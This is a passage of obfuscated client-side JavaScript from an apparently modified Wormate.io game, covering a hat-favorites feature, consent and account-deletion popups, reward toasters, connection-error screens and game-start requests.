          var _0x4eb8a8 = _0x2c8452 === "success" ? "rgba(76, 175, 80, 0.9)" : _0x2c8452 === "error" ? "rgba(244, 67, 54, 0.9)" : "rgba(33, 150, 243, 0.9)";
          var _0x30d25c = $("<div id='hat-notification'>").css({
            position: "fixed",
            top: "20px",
            right: "20px",
            background: _0x4eb8a8,
            color: "white",
            padding: "12px 16px",
            "border-radius": "6px",
            "z-index": "999999",
            "font-size": "14px",
            "box-shadow": "0 4px 12px rgba(0,0,0,0.3)",
            "max-width": "300px",
            "word-wrap": "break-word"
          }).html("🎩 " + _0x5a71f8);
          $("body").append(_0x30d25c);
          setTimeout(function () {
            _0x30d25c.fadeOut(500, function () {
              $(this).remove();
            });
          }, 3000);
        }
        window.HatFavoritesAPI = {
          addHat: function (_0x539f36) {
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            if (!vps.selectedHats.includes(_0x539f36)) {
              vps.selectedHats.push(_0x539f36);
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x10e358("Hat #" + _0x539f36 + " added to favorites!", "success");
              return true;
            } else {
              _0x10e358("Hat #" + _0x539f36 + " is already in favorites!", "info");
              return false;
            }
          },
          removeHat: function (_0x4af42d) {
            if (!vps.selectedHats) {
              return false;
            }
            var _0x14c293 = vps.selectedHats.indexOf(_0x4af42d);
            if (_0x14c293 > -1) {
              vps.selectedHats.splice(_0x14c293, 1);
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x10e358("Hat #" + _0x4af42d + " removed from favorites!", "success");
              return true;
            } else {
              _0x10e358("Hat #" + _0x4af42d + " not found in favorites!", "error");
              return false;
            }
          },
          getFavorites: function () {
            return vps.selectedHats || [];
          },
          cycle: function () {
            _0x451418();
          },
          clearAll: function () {
            if (confirm("Are you sure you want to remove all favorite hats?")) {
              vps.selectedHats = [];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x10e358("All favorite hats cleared!", "success");
              return true;
            }
            return false;
          },
          openDialog: function () {
            if (typeof _0x55d57a !== "undefined") {
              var _0x1e385d = new _0x55d57a();
              if (_0x1e385d.showFavoritesDialog) {
                _0x1e385d.showFavoritesDialog();
              }
            }
          },
          getCurrentHat: function () {
            return _0x3beae2();
          },
          getAvailableHats: function () {
            return _0x46cfd1();
          },
          addCurrentHat: function () {
            var _0xe72226 = _0x3beae2();
            if (_0xe72226.currentHatId) {
              return this.addHat(_0xe72226.currentHatId);
            } else {
              _0x10e358("No hat currently selected!", "error");
              return false;
            }
          },
          isInFavorites: function (_0x10d30d) {
            if (vps.selectedHats) {
              return vps.selectedHats.includes(_0x10d30d);
            } else {
              return false;
            }
          },
          applyHat: function (_0x367867) {
            var _0x839299 = _0x2db106(_0x367867);
            if (_0x839299) {
              _0x10e358("Hat #" + _0x367867 + " applied!", "success");
            } else {
              _0x10e358("Failed to apply hat #" + _0x367867, "error");
            }
            return _0x839299;
          }
        };
        window.addEventListener("error", function (_0x518151) {
          if (_0x518151.message && _0x518151.message.toLowerCase().includes("hat")) {
            console.warn("🚨 Hat System Error:", _0x518151.message);
          }
        });
        function _0x314203() {
          var _0xdad6e8 = {
            vpsExists: typeof vps !== "undefined",
            selectedHatsExists: vps && Array.isArray(vps.selectedHats),
            favoritesCount: vps && vps.selectedHats ? vps.selectedHats.length : 0,
            cacheSize: window.globalHatTextureCache ? Object.keys(window.globalHatTextureCache).length : 0,
            keyboardInitialized: window.hatCyclingInitialized || false
          };
          return _0xdad6e8;
        }
        window.checkHatSystemHealth = _0x314203;
        window.showHatNotification = _0x10e358;
        setTimeout(function () {
          _0x314203();
        }, 3000);
        var _0x536521 = function () {
          function _0x29bdfe(_0x52b0e7, _0x44e359, _0x520ea1) {
            this.Yo = _0x52b0e7;
            this.nd = _0x44e359;
            this.Ao = _0x520ea1;
            this.ac = {};
            this.mp = [[]];
            this.np = -10;
            this.op = -10;
          }
          _0x29bdfe.prototype.ip = function (_0x459655) {
            this.mp = _0x459655;
          };
          _0x29bdfe.prototype.jp = function (_0x23816d) {
            this.ac = _0x23816d;
          };
          _0x29bdfe.prototype.Gk = function () {
            var _0x4efe9d = _0xf1d21a();
            var _0x2f844e = _0x4efe9d.On.rj(this.nd);
            for (var _0x4a9b8d = 0; _0x4a9b8d < this.mp.length; _0x4a9b8d++) {
              for (var _0x4423bc = 0; _0x4423bc < this.mp[_0x4a9b8d].length; _0x4423bc++) {
                if (this.mp[_0x4a9b8d][_0x4423bc] == _0x2f844e) {
                  this.pp(_0x4a9b8d);
                  this.qp(_0x4423bc);
                  return;
                }
              }
            }
            this.pp(0);
            this.qp(0);
          };
          _0x29bdfe.prototype.fp = function () {
            var _0x5012c9 = this.np - 1;
            if (_0x5012c9 < 0) {
              _0x5012c9 = this.mp.length - 1;
            }
            this.pp(_0x5012c9);
            this.qp(this.op % this.mp[_0x5012c9].length);
          };
          _0x29bdfe.prototype.gp = function () {
            var _0x131ed8 = this.np + 1;
            if (_0x131ed8 >= this.mp.length) {
              _0x131ed8 = 0;
            }
            this.pp(_0x131ed8);
            this.qp(this.op % this.mp[_0x131ed8].length);
          };
          _0x29bdfe.prototype.pp = function (_0x4365f9) {
            var _0x4bfc97 = this;
            if (!(_0x4365f9 < 0) && !(_0x4365f9 >= this.mp.length)) {
              this.np = _0x4365f9;
              _0xae159f.empty();
              var _0x47e5c2 = this.mp[this.np];
              if (_0x47e5c2.length > 1) {
                for (var _0x11b81f = 0; _0x11b81f < _0x47e5c2.length; _0x11b81f++) {
                  (function (_0x41a8de) {
                    var _0x4f1db6 = _0x47e5c2[_0x41a8de];
                    var _0x115d29 = _0x4bfc97.ac[_0x4f1db6];
                    var _0x2de132 = "#" + _0x4bfc97.Yo.dp[_0x115d29.prime];
                    var _0x188e84 = $("<div style=\"border-color:" + _0x2de132 + "\"></div>");
                    _0x188e84.click(function () {
                      _0xf1d21a().Ci.Be();
                      _0x4bfc97.qp(_0x41a8de);
                    });
                    _0xae159f.append(_0x188e84);
                  })(_0x11b81f);
                }
              }
            }
          };
          _0x29bdfe.prototype.qp = function (_0x22fc0c) {
            if (!(_0x22fc0c < 0) && !(_0x22fc0c >= this.mp[this.np].length)) {
              this.op = _0x22fc0c;
              _0xae159f.children().css("background-color", "transparent");
              var _0xe2a491 = _0xae159f.children(":nth-child(" + (1 + _0x22fc0c) + ")");
              _0xe2a491.css("background-color", _0xe2a491.css("border-color"));
              this.Yo.Po(true);
            }
          };
          _0x29bdfe.prototype.Wo = function () {
            return this.mp[this.np][this.op];
          };
          return _0x29bdfe;
        }();
        return _0x55d57a;
      }();
      _0x1c97c7.Yj = function () {
        var _0x14d73e = $("#withdraw-consent-yes");
        var _0x3d36d9 = $("#withdraw-consent-no");
        var _0x4eb34a = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.consent.tab"), false);
          var _0x1e3de4 = _0xf1d21a();
          _0x14d73e.click(function () {
            _0x1e3de4.Ci.Be();
            if (_0x1e3de4.Go()) {
              _0x1e3de4.og.Ak(_0x1e3de4.og._e);
              _0x1e3de4.rp(false, true);
              _0x1e3de4.og.qk._n(new _0x1c97c7.sp());
            } else {
              _0x1e3de4.og.Dk();
            }
          });
          _0x3d36d9.click(function () {
            _0x1e3de4.Ci.Be();
            _0x1e3de4.og.Dk();
          });
        });
        _0x4eb34a.prototype.ha = function () {
          _0x4eb34a.parent.prototype.ha.call(this);
        };
        _0x4eb34a.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeIn(200);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x4eb34a.prototype.Hk = function () {
          _0xf1d21a().Ci.Ce();
        };
        return _0x4eb34a;
      }();
      _0x1c97c7.$j = function () {
        var _0x2bc58f = $("#delete-account-timer");
        var _0x26cece = $("#delete-account-yes");
        var _0x594d29 = $("#delete-account-no");
        var _0x17c450 = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.delete.tab"), false);
          var _0x3b18a8 = _0xf1d21a();
          _0x26cece.click(function () {
            _0x3b18a8.Ci.Be();
            if (_0x3b18a8.Ij.Hj()) {
              _0x3b18a8.Ij.Sl();
              _0x3b18a8.Ij.Kl();
            } else {
              _0x3b18a8.og.Dk();
            }
          });
          _0x594d29.click(function () {
            _0x3b18a8.Ci.Be();
            _0x3b18a8.og.Dk();
          });
          this.tp = [];
        });
        _0x17c450.prototype.ha = function () {
          _0x17c450.parent.prototype.ha.call(this);
        };
        _0x17c450.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeIn(200);
        };
        _0x17c450.prototype.Hk = function () {
          _0xf1d21a().Ci.Ge();
          _0x26cece.stop();
          _0x26cece.hide();
          _0x2bc58f.stop();
          _0x2bc58f.show();
          _0x2bc58f.text(".. 10 ..");
          this.up();
          this.vp(function () {
            _0x2bc58f.text(".. 9 ..");
          }, 1000);
          this.vp(function () {
            _0x2bc58f.text(".. 8 ..");
          }, 2000);
          this.vp(function () {
            _0x2bc58f.text(".. 7 ..");
          }, 3000);
          this.vp(function () {
            _0x2bc58f.text(".. 6 ..");
          }, 4000);
          this.vp(function () {
            _0x2bc58f.text(".. 5 ..");
          }, 5000);
          this.vp(function () {
            _0x2bc58f.text(".. 4 ..");
          }, 6000);
          this.vp(function () {
            _0x2bc58f.text(".. 3 ..");
          }, 7000);
          this.vp(function () {
            _0x2bc58f.text(".. 2 ..");
          }, 8000);
          this.vp(function () {
            _0x2bc58f.text(".. 1 ..");
          }, 9000);
          this.vp(function () {
            _0x2bc58f.hide();
            _0x26cece.fadeIn(300);
          }, 10000);
        };
        _0x17c450.prototype.vp = function (_0x156273, _0x6916fe) {
          var _0x12aeaa = setTimeout(_0x156273, _0x6916fe);
          this.tp.push(_0x12aeaa);
        };
        _0x17c450.prototype.up = function () {
          for (var _0x3c7a76 = 0; _0x3c7a76 < this.tp.length; _0x3c7a76++) {
            clearTimeout(this.tp[_0x3c7a76]);
          }
          this.tp = [];
        };
        return _0x17c450;
      }();
      _0x1c97c7.wp = function () {
        function _0x3db7d5() {
          this.ao = function () {};
        }
        _0x3db7d5.prototype.tf = function () {};
        _0x3db7d5.prototype.Hk = function () {};
        return _0x3db7d5;
      }();
      _0x1c97c7.Gl = function () {
        var _0x2b176b = _0x503ed4.M(_0x1c97c7.wp, function (_0x3ce027) {
          _0x1c97c7.wp.call(this);
          var _0x35cfac = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x35cfac + "\" class=\"toaster toaster-coins\">    <img class=\"toaster-coins-img\" alt=\"Wormate Coin\" src=\"/images/coin_320.png\" />    <div class=\"toaster-coins-val\">+" + _0x3ce027 + "</div>    <div class=\"toaster-coins-close\">" + _0x503ed4.H("index.game.toaster.continue") + "</div></div>");
          var _0x5dff62 = this;
          this.xp.find(".toaster-coins-close").click(function () {
            _0xf1d21a().Ci.Be();
            _0x5dff62.ao();
          });
        });
        _0x2b176b.prototype.tf = function () {
          return this.xp;
        };
        _0x2b176b.prototype.Hk = function () {
          _0xf1d21a().Ci.Ee();
        };
        return _0x2b176b;
      }();
      _0x1c97c7.Fl = function () {
        var _0x4614a0 = _0x503ed4.M(_0x1c97c7.wp, function (_0x2e468a) {
          _0x1c97c7.wp.call(this);
          var _0x52f623 = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x52f623 + "\" class=\"toaster toaster-levelup\">    <img class=\"toaster-levelup-img\" alt=\"Wormate Level Up Star\" src=\"/images/level-star.svg\" />    <div class=\"toaster-levelup-val\">" + _0x2e468a + "</div>    <div class=\"toaster-levelup-text\">" + _0x503ed4.H("index.game.toaster.levelup") + "</div>    <div class=\"toaster-levelup-close\">" + _0x503ed4.H("index.game.toaster.continue") + "</div></div>");
          var _0x22d6c7 = this;
          this.xp.find(".toaster-levelup-close").click(function () {
            _0xf1d21a().Ci.Be();
            _0x22d6c7.ao();
          });
        });
        _0x4614a0.prototype.tf = function () {
          return this.xp;
        };
        _0x4614a0.prototype.Hk = function () {
          _0xf1d21a().Ci.De();
        };
        return _0x4614a0;
      }();
      _0x1c97c7.sp = function () {
        var _0x346d27 = _0x503ed4.M(_0x1c97c7.wp, function () {
          _0x1c97c7.wp.call(this);
          var _0x248b85 = this;
          var _0x1bbdda = _0xf1d21a();
          var _0x181d78 = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x181d78 + "\" class=\"toaster toaster-consent-accepted\">    <img class=\"toaster-consent-accepted-logo\" src=\"" + _0x503ed4.a.d + "\" alt=\"Wormate.io logo\"/>    <div class=\"toaster-consent-accepted-container\">        <span class=\"toaster-consent-accepted-text\">" + _0x503ed4.H("index.game.toaster.consent.text").replaceAll(" ", "&nbsp;").replaceAll("\n", "<br/>") + "</span>        <a class=\"toaster-consent-accepted-link\" href=\"/privacy-policy\">" + _0x503ed4.H("index.game.toaster.consent.link") + "</a>    </div>    <div class=\"toaster-consent-close\">" + _0x503ed4.H("index.game.toaster.consent.iAccept") + "</div></div>");
          this.yp = this.xp.find(".toaster-consent-close");
          this.yp.hide();
          this.yp.click(function () {
            _0x1bbdda.Ci.Be();
            if (_0x1bbdda.Go()) {
              _0x1bbdda.rp(true, true);
            }
            _0x248b85.ao();
          });
        });
        _0x346d27.prototype.tf = function () {
          return this.xp;
        };
        _0x346d27.prototype.Hk = function () {
          var _0x1f540b = this;
          var _0x5f25e7 = _0xf1d21a();
          if (_0x5f25e7.Go() && !_0x5f25e7.hl()) {
            _0x5f25e7.Ci.Ge();
            setTimeout(function () {
              _0x1f540b.yp.fadeIn(300);
            }, 2000);
          } else {
            setTimeout(function () {
              _0x1f540b.ao();
            }, 0);
          }
        };
        return _0x346d27;
      }();
      _0x1c97c7.uk = function () {
        var _0x52b6d8 = $("#error-gateway-connection-retry");
        var _0x3f7807 = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
          var _0x5caccf = _0xf1d21a();
          _0x52b6d8.click(function () {
            _0x5caccf.Ci.Be();
            _0x5caccf.og.ie.Mn();
            _0x5caccf.og.Ak(_0x5caccf.og.ie);
            setTimeout(function () {
              var _0x1d9de3 = _0x503ed4.a.b + "/pub/healthCheck/ping";
              _0x503ed4.Z(_0x1d9de3, function () {
                _0x5caccf.og.Ak(_0x5caccf.og.tk);
              }, function (_0x329ccd) {
                _0x5caccf.og.ie.Kn();
                _0x5caccf.Lc.Ib(function () {
                  _0x5caccf.og.Ak(_0x5caccf.og._e);
                }, function (_0x40a7af) {
                  _0x5caccf.og.Ak(_0x5caccf.og.tk);
                }, function (_0x2991c5, _0x1aa18c) {
                  var _0x193f7f = _0x2991c5;
                  _0x5caccf.og.ie.Ln(_0x193f7f, _0x1aa18c);
                });
              });
            }, 2000);
          });
        });
        _0x3f7807.prototype.ha = function () {};
        _0x3f7807.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeIn(500);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeOut(50);
        };
        _0x3f7807.prototype.Hk = function () {
          var _0xeb27b0 = _0xf1d21a();
          _0xeb27b0.Ci.pe(_0x1c97c7.ge.je._e);
          _0xeb27b0.Ci.Ge();
        };
        return _0x3f7807;
      }();
      _0x1c97c7.wk = function () {
        var _0x2a0fa8 = $("#error-game-connection-retry");
        var _0x1b00cc = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
          var _0x691169 = _0xf1d21a();
          _0x2a0fa8.click(function () {
            _0x691169.Ci.Be();
            _0x691169.og.Ak(_0x691169.og._e);
          });
        });
        _0x1b00cc.prototype.ha = function () {};
        _0x1b00cc.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeIn(500);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeOut(50);
        };
        _0x1b00cc.prototype.Hk = function () {
          var _0x38110c = _0xf1d21a();
          _0x38110c.Ci.pe(_0x1c97c7.ge.je._e);
          _0x38110c.Ci.Ge();
        };
        return _0x1b00cc;
      }();
      _0x503ed4.zp = function () {
        function _0x14a4af(_0x503642) {
          var _0x2a34fb = _0x503642 + Math.floor(Math.random() * 65535) * 37;
          _0x1c97c7.Vf.eg(_0x1c97c7.Vf.cg, _0x2a34fb, 30);
        }
        function _0x4b56be() {
          return parseInt(_0x1c97c7.Vf.fg(_0x1c97c7.Vf.cg)) % 37;
        }
        return function () {
          var _0x5914ea = _0x4b56be();
          if (!(_0x5914ea >= 0) || !(_0x5914ea < _0x4e74ef.Ap)) {
            _0x5914ea = Math.max(0, _0x4e74ef.Ap - 2);
          }
          var _0x5e2794 = {
            zn: _0x4e74ef,
            Bp: false
          };
          _0x5e2794.Cp = Date.now();
          _0x5e2794.Dp = 0;
          _0x5e2794.Ep = 0;
          _0x5e2794.Fp = null;
          _0x5e2794.Gp = _0x503ed4.a.j;
          _0x5e2794.Hp = _0x503ed4.a.i;
          _0x5e2794.dh = null;
          _0x5e2794.Lc = null;
          _0x5e2794.xe = null;
          _0x5e2794.Ci = null;
          _0x5e2794.og = null;
          _0x5e2794.On = null;
          _0x5e2794.Ij = null;
          try {
            if (navigator && navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(function (_0x56515a) {
                if (_0x56515a.coords !== undefined) {
                  var _0x444986 = _0x56515a.coords;
                  if (_0x444986.latitude !== undefined && _0x444986.longitude !== undefined) {
                    _0x5e2794.Fp = _0x56515a;
                  }
                }
              }, function (_0x29c0d9) {});
            }
          } catch (_0x5b6dff) {}
          _0x5e2794.Ip = function () {
            _0x5e2794.dh = new _0x1c97c7.Engine();
            _0x5e2794.dh.Kp = new _0x1c97c7.MessageProcessor(_0x5e2794.dh);
            _0x5e2794.Lc = new _0x1c97c7._a();
            _0x5e2794.xe = new _0x1c97c7.Qj();
            _0x5e2794.Ci = new _0x1c97c7.ge();
            _0x5e2794.og = new _0x1c97c7.Tj();
            _0x5e2794.On = new _0x1c97c7.kj();
            _0x5e2794.Ij = new _0x1c97c7.Mk();
            _0x5e2794.ha();
          };
          _0x5e2794.ha = function () {
            try {
              ga("send", "event", "app", window.runtimeHash + "_init");
            } catch (_0x206e64) {}
            _0x5e2794.dh.Lp = function () {
              _0x5e2794.og.Ak(_0x5e2794.og.vk);
            };
            _0x5e2794.dh.Mp = function () {
              var _0x266848 = _0x5e2794.og._e.Wn();
              try {
                ga("send", "event", "game", window.runtimeHash + "_start", _0x266848);
              } catch (_0x4031d9) {}
              _0x5e2794.Ci.pe(_0x1c97c7.ge.je.af);
              _0x5e2794.og.Ak(_0x5e2794.og.af.Dn());
            };
            _0x5e2794.dh.Np = function () {
              try {
                ga("send", "event", "game", window.runtimeHash + "_end");
              } catch (_0x3d14f2) {}
              if ($("body").height() >= 430) {
                _0x5e2794.zn.Op.ka();
              }
              _0x5e2794.Lc.Ib(null, null, null);
              (function () {
                var _0x587e36 = Math.floor(_0x5e2794.dh.ch.Bh);
                var _0x42edc4 = _0x5e2794.dh.Ih;
                if (_0x5e2794.Ij.Hj()) {
                  _0x5e2794.Ij.Bl(function () {
                    _0x5e2794.Pp(_0x587e36, _0x42edc4);
                  });
                } else {
                  _0x5e2794.Pp(_0x587e36, _0x42edc4);
                }
              })();
            };
            _0x5e2794.dh.Qp = function (_0x479dc3) {
              _0x479dc3(_0x5e2794.og.af.Gn(), _0x5e2794.og.af.Hn());
            };
            _0x5e2794.Ij.yl(function () {
              var _0x50e075 = _0x5e2794.og.Lk();
              if (_0x50e075 != null && _0x50e075.nd === _0x1c97c7.Fk.Ek) {
                _0x5e2794.Ci.pe(_0x1c97c7.ge.je._e);
                _0x5e2794.og.Ak(_0x5e2794.og._e);
              }
              if (_0x5e2794.Ij.Hj()) {
                try {
                  var _0xd51b67 = _0x5e2794.Ij.cl();
                  ga("set", "userId", _0xd51b67);
                } catch (_0x439516) {}
              }
              if (_0x5e2794.Go() && _0x5e2794.Ij.Hj() && !_0x5e2794.Ij.hl()) {
                _0x5e2794.rp(false, false);
                _0x5e2794.og.qk._n(new _0x1c97c7.sp());
              } else {
                _0x5e2794.Rp(true);
              }
            });
            _0x5e2794.dh.run();
            _0x5e2794.og.ha();
            _0x5e2794.On.ha();
            _0x5e2794.Lc.ha();
            _0x5e2794.og._e.Vn();
            _0x5e2794.og.Ak(_0x5e2794.og._e);
            _0x5e2794.xe.ha(function () {
              _0x5e2794.Ci.ha();
              _0x5e2794.Ij.ha();
              _0x5e2794.Lc.Ib(function () {
                _0x5e2794.og._e.Un();
                _0x5e2794.og.Ak(_0x5e2794.og._e);
              }, function (_0x39641e) {
                _0x5e2794.og._e.Un();
                _0x5e2794.og.Ak(_0x5e2794.og.tk);
              }, function (_0x1db814, _0x20fda0) {
                var _0x1bc22b = _0x1db814;
                _0x5e2794.og.ie.Ln(_0x1bc22b, _0x20fda0);
                _0x5e2794.og._e.Ln(_0x1bc22b, _0x20fda0);
              });
              if (_0x5e2794.Go() && !_0x5e2794.hl()) {
                _0x5e2794.og.qk._n(new _0x1c97c7.sp());
              } else {
                _0x5e2794.Rp(true);
              }
            });
          };
          _0x5e2794.Sp = function (_0x44c1ec) {
            if (_0x5e2794.Ij.Hj()) {
              var _0x15c1f9 = _0x5e2794.Ij.Al();
              var _0x26d689 = _0x503ed4.a.b + "/pub/wuid/" + _0x15c1f9 + "/consent/change?value=" + encodeURI(_0x44c1ec);
              _0x503ed4.Z(_0x26d689, function () {}, function (_0x286031) {});
            }
          };
          _0x5e2794.Pn = function (_0x1ccce0) {
            _0x5914ea++;
            if (!_0x5e2794.zn.Tp && _0x5914ea >= _0x5e2794.zn.Ap) {
              _0x5e2794.og.Ak(_0x5e2794.og.xk);
              _0x5e2794.Ci.pe(_0x1c97c7.ge.je.cf);
              _0x5e2794.zn.Up.ia();
            } else {
              _0x14a4af(_0x5914ea);
              _0x5e2794.Vp(_0x1ccce0);
            }
          };
          _0x5e2794.Vp = function (_0x200764) {
            if (_0x5e2794.dh.Wp()) {
              _0x5e2794.og.ie.Mn();
              _0x5e2794.og.Ak(_0x5e2794.og.ie);
              var _0x41be47 = _0x5e2794.og._e.Wn();
              _0x1c97c7.Vf.eg(_0x1c97c7.Vf._f, _0x41be47, 30);
              var _0x29bac2 = _0x5e2794.og.$h.Zh();
              _0x1c97c7.Vf.eg(_0x1c97c7.Vf.Xf, _0x29bac2, 30);
              var _0x48e778 = 0;
              if (_0x5e2794.Fp != null) {
                var _0x3ae125 = _0x5e2794.Fp.coords.latitude;
                var _0x5e6b2 = _0x5e2794.Fp.coords.longitude;
                _0x48e778 = Math.max(0, Math.min(32767, (_0x3ae125 + 90) / 180 * 32768)) << 1 | 1 | Math.max(0, Math.min(65535, (_0x5e6b2 + 180) / 360 * 65536)) << 16;
              }
              if (_0x5e2794.Ij.Hj()) {
                _0x5e2794.Xp(_0x41be47, _0x48e778, _0x200764);
              } else {
                var _0x5b8413 = _0x5e2794.og._e.el();
                _0x1c97c7.Vf.eg(_0x1c97c7.Vf.ag, _0x5b8413, 30);
                var _0x431dec = _0x5e2794.On.rj(_0x1c97c7.tj.sj);
                _0x1c97c7.Vf.eg(_0x1c97c7.Vf.bg, _0x431dec, 30);
                _0x5e2794.Yp(_0x41be47, _0x48e778);
              }
            }
          };
          _0x5e2794.Xp = function (_0x97a118, _0x21232a, _0x58032c) {
            var _0x147ee9 = _0x5e2794;
            var _0x10a15c = _0x5e2794.Ij.Al();
            var _0x69aef = _0x5e2794.og._e.el();
            var _0x3c4678 = _0x5e2794.On.rj(_0x1c97c7.tj.sj);
            var _0x43bb71 = _0x5e2794.On.rj(_0x1c97c7.tj.uj);
            var _0x424124 = _0x5e2794.On.rj(_0x1c97c7.tj.vj);
            var _0x21d997 = _0x5e2794.On.rj(_0x1c97c7.tj.xj);
            var _0x3248f1 = _0x5e2794.On.rj(_0x1c97c7.tj.wj);
            var _0x55f4fa = (_0x38f67d ? window.vps.s_l : _0x503ed4.a.b) + "/pub/wuid/" + _0x10a15c + "/start?gameMode=" + encodeURI(_0x97a118) + "&gh=" + _0x21232a + "&nickname=" + _0x553ea5(_0x498743.Xp(_0x10a15c, _0x69aef, _0x3c4678, _0x43bb71, _0x424124, _0x21d997, _0x3248f1), true) + "&skinId=" + window.vps.a + "&eyesId=" + window.vps.b + "&mouthId=" + window.vps.c + "&glassesId=" + window.vps.d + "&hatId=" + window.vps.e;
            _0x503ed4.Z(_0x55f4fa, function () {
              _0x147ee9.og.Ak(_0x147ee9.og.tk);
            }, function (_0x267164) {
              if (_0x267164.code === 1460) {
                _0x147ee9.og.Ak(_0x147ee9.og.ok);
                try {
                  ga("send", "event", "restricted", window.runtimeHash + "_tick");
                } catch (_0x2340f2) {}
              } else if (false) {} else {
                if (!_0x267164.server_url) {
                  _0x3b6ea9.dh.Cq();
                  return;
                }
                var _0xf9c34b = _0x267164.server_url;
                _0x147ee9.dh.Zp(_0xf9c34b, _0x10a15c, _0x58032c);
              }
            });
          };
          _0x5e2794.Yp = function (_0x4cf95f, _0x212379) {
            var _0x5775ea = _0x5e2794;
            var _0x1772a3 = _0x5e2794.og._e.el();
            var _0x87fcaa = _0x5e2794.On.rj(_0x1c97c7.tj.sj);
            var _0x28b6a5 = _0x503ed4.a.b + "/pub/wuid/guest/start?gameMode=" + encodeURI(_0x4cf95f) + "&gh=" + _0x212379 + "&nickname=" + encodeURI(_0x553ea5(_0x1772a3, true)) + "&skinId=" + encodeURI(_0x87fcaa);
            _0x503ed4.Z(_0x28b6a5, function () {
              _0x5775ea.og.Ak(_0x5775ea.og.tk);
            }, function (_0x9c2603) {
